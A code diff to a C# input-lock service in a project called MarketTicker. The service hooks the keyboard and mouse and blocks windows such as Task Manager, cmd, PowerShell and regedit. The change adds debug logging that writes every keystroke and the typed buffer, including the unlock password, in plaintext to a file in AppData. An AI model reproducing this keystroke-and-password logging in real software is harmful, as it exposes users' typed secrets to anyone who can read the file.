@@ -1,4 +1,5 @@
 using System.Diagnostics;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using MarketTicker.Interop;
@@ -10,6 +11,10 @@ public sealed class InputLockService : IDisposable
 {
     private static readonly string[] BlockedWindows =
         ["taskmgr", "cmd", "powershell", "pwsh", "regedit", "mmc", "msconfig"];
+
+    private static readonly string LogPath = Path.Combine(
+        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+        "MarketTicker", "lock.log");
 
     private readonly NativeMethods.LowLevelKeyboardProc _keyboardProc;
     private readonly NativeMethods.LowLevelMouseProc _mouseProc;
@@ -168,6 +173,7 @@ public sealed class InputLockService : IDisposable
         {
             var vkCode = (uint)Marshal.ReadInt32(lParam);
             var ch = VkToChar(vkCode);
+            Log($"key 0x{vkCode:X2} → {(ch.HasValue ? $"'{ch.Value}'" : "null")}");
             if (ch.HasValue)
             {
                 _typedBuffer.Append(ch.Value);
@@ -175,9 +181,13 @@ public sealed class InputLockService : IDisposable
                 if (_typedBuffer.Length > maxLen)
                     _typedBuffer.Remove(0, _typedBuffer.Length - maxLen);
 
-                if (_typedBuffer.Length >= _password.Length &&
-                    _typedBuffer.ToString().EndsWith(_password, StringComparison.OrdinalIgnoreCase))
+                var buf = _typedBuffer.ToString();
+                var match = buf.Length >= _password.Length &&
+                            buf.EndsWith(_password, StringComparison.OrdinalIgnoreCase);
+                Log($"  buffer[{buf.Length}]: \"{buf}\" match={match}");
+                if (match)
                 {
+                    Log("  → UNLOCK");
                     Unlock();
                 }
             }
@@ -199,6 +209,8 @@ public sealed class InputLockService : IDisposable
 
     private static char? VkToChar(uint vkCode)
     {
+        // Only track alphanumeric and space; ignore shift state for digits
+        // (case is handled by OrdinalIgnoreCase comparison)
         var shift = (NativeMethods.GetAsyncKeyState(NativeMethods.VK_SHIFT) & 0x8000) != 0;
         var caps = (NativeMethods.GetKeyState(NativeMethods.VK_CAPITAL) & 1) != 0;
         var upper = shift ^ caps;
@@ -206,11 +218,17 @@ public sealed class InputLockService : IDisposable
         return vkCode switch
         {
             >= 0x41 and <= 0x5A => upper ? (char)vkCode : (char)(vkCode + 32),
-            >= 0x30 and <= 0x39 when !shift => (char)vkCode,
+            >= 0x30 and <= 0x39 => (char)vkCode,
             >= 0x60 and <= 0x69 => (char)('0' + (vkCode - 0x60)),
             0x20 => ' ',
             _ => null
         };
+    }
+
+    private static void Log(string message)
+    {
+        try { File.AppendAllText(LogPath, $"{DateTime.Now:HH:mm:ss.fff} {message}{Environment.NewLine}"); }
+        catch { }
     }
 
     public void Dispose()
